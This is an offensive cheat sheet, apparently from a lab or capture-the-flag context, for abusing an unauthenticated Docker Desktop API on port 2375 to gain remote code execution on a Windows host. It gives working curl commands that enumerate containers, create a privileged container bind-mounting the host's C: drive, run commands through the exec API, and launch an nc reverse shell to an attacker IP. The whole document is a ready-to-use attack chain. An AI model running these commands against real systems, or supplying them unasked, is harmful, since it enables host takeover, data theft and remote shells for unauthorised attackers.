Docker API Abuse :2375 · Windows host

Docker Desktop on Windows can expose the Docker daemon on 2375/tcp without TLS. From a pivot container, that means full RCE on the host.

1. Detect the API

# Inside the container
curl http://192.168.65.7:2375/version
Docker Desktop for Windows uses 192.168.65.0/24 (or similar) for its internal bridge. Confirm the address via ss -tulpn / routing table inside the container.

2. List running containers (intel)

curl http://192.168.65.7:2375/containers/json

Inspect labels — Docker Compose leaks the project path:

"com.docker.compose.project.working_dir": "C:\\Users\\Administrator\\Documents\\docker_setup"

3. Create a privileged container bound to C:\

curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/create?name=pwned \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["sleep", "infinity"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/mnt/host/c/:/mnt/windows"]
    }
  }'
Key trick: Docker Desktop exposes the Windows C:\ drive as /mnt/host/c/ inside its VM. Binding it to /mnt/windows inside our container = read/write the whole host disk.

Expected response:

{"Id":"cfd1c32e3ec042b0bc9aa5a31af2ba4d47e2324131c351d6faa295ed57133a95","Warnings":[]}

4. Start the container

curl -X POST http://192.168.65.7:2375/containers/pwned/start

5. Exec a command inside it

curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/pwned/exec \
  -d '{
    "Cmd": ["ls", "-la", "/mnt/windows/Users"],
    "AttachStdout": true,
    "AttachStderr": true
  }'

This returns an exec Id; actually run it with:

curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/exec/<EXEC_ID>/start \
  -d '{"Detach": false, "Tty": false}'

6. One-shot reverse shell

EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/pwned/exec \
  -d '{"Cmd": ["nc", "10.10.15.57", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \
  | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

curl -X POST -H "Content-Type: application/json" \
  "http://192.168.65.7:2375/exec/$EXEC_ID/start" \
  -d '{"Detach": false, "Tty": false}' --no-buffer &

Endpoint cheatsheet

EndpointPurpose
GET /versionDaemon info — confirms API reachable.
GET /containers/jsonList running containers.
GET /containers/json?all=1List all containers (stopped included).
GET /images/jsonList local images (pick one you can reuse).
POST /containers/createCreate a new container (JSON body).
POST /containers/<id>/startStart it.
POST /containers/<id>/execPrepare an exec instance.
POST /exec/<id>/startRun the prepared exec.
